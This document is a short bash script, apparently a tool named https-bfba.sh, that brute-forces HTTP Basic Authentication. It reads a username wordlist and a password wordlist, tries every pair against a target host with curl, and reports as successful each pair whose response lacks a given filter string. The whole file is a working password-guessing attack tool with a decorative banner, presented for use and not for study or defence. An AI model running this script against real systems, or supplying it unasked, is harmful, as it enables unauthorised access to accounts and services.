#!/bin/bash

# Setting colors
RED='\033[0;31m'
BLUE='\033[0;34m'
GREEN='\033[0;32m'
PURPLE='\033[0;35m'
NC='\033[0m'

# Function to display usage
usage() {
    echo -e "${RED}|:| ERROR |:| ${NC}Usage: ./https-bfba.sh -u <usernames_file> -p <passwords_file> -d <domain_or_ip> -r <response_filter>"
    exit 1
}

echo ""
echo -e "${GREEN} _   _ _____ ___________  _________"
echo -e "| | | |_   _|_   _| ___ \/ /  ___\ \\"
echo -e "| |_| | | |   | | | |_/ / |\ \`--. | |"
echo -e "|  _  | | |   | | |  __/| | \`--. \| |"
echo -e "| | | | | |   | | | |   | |/\__/ /| |"
echo -e "\_| |_/ \_/   \_/ \_|   \_\\\\\\____/ /_/"
echo -e "${RED}______            _        ______"
echo -e "| ___ \          | |       |  ___|"
echo -e "| |_/ /_ __ _   _| |_ ___  | |_ ___  _ __ ___ ___"
echo -e "| ___ \ '__| | | | __/ _ \ |  _/ _ \| '__/ __/ _ \\"
echo -e "| |_/ / |  | |_| | ||  __/ | || (_) | | | (_|  __/"
echo -e "\____/|_|   \__,_|\__\___| \_| \___/|_|  \___\___|"
echo -e "${PURPLE}______           _         ___        _   _"
echo -e "| ___ \         (_)       / _ \      | | | |"
echo -e "| |_/ / __ _ ___ _  ___  / /_\ \_   _| |_| |__"
echo -e "| ___ \/ _\` / __| |/ __| |  _  | | | | __| '_ \ "
echo -e "| |_/ / (_| \__ \ | (__  | | | | |_| | |_| | | |"
echo -e "\____/ \__,_|___/_|\___| \_| |_/\__,_|\__|_| |_|"
echo ""
echo -e "${NC}Running..."
echo ""

# Parse command-line arguments
while getopts "u:p:d:r:" opt; do
    case "${opt}" in
        u)
            usernames_file=${OPTARG}
            ;;
        p)
            passwords_file=${OPTARG}
            ;;
        d)
            domain_or_ip=${OPTARG}
            ;;
        r)
            response_filter=${OPTARG}
            ;;
        *)
            usage
            ;;
    esac
done

# Check if all arguments are provided
if [ -z "${usernames_file}" ] || [ -z "${passwords_file}" ] || [ -z "${domain_or_ip}" ] || [ -z "${response_filter}" ]; then
    usage
fi

# Loop through each username and password combination
while IFS= read -r username; do
    while IFS= read -r password; do
        # Perform the login attempt using curl
        response=$(curl -s -u "${username}:${password}" "${domain_or_ip}")

        # Check if the response contains the filter string
        if [[ "${response}" != *"${response_filter}"* ]]; then
            echo -e "${GREEN}Login with ${BLUE}${username}${GREEN}:${BLUE}${password} ${GREEN}successful."
        fi
    done < "${passwords_file}"
done < "${usernames_file}"
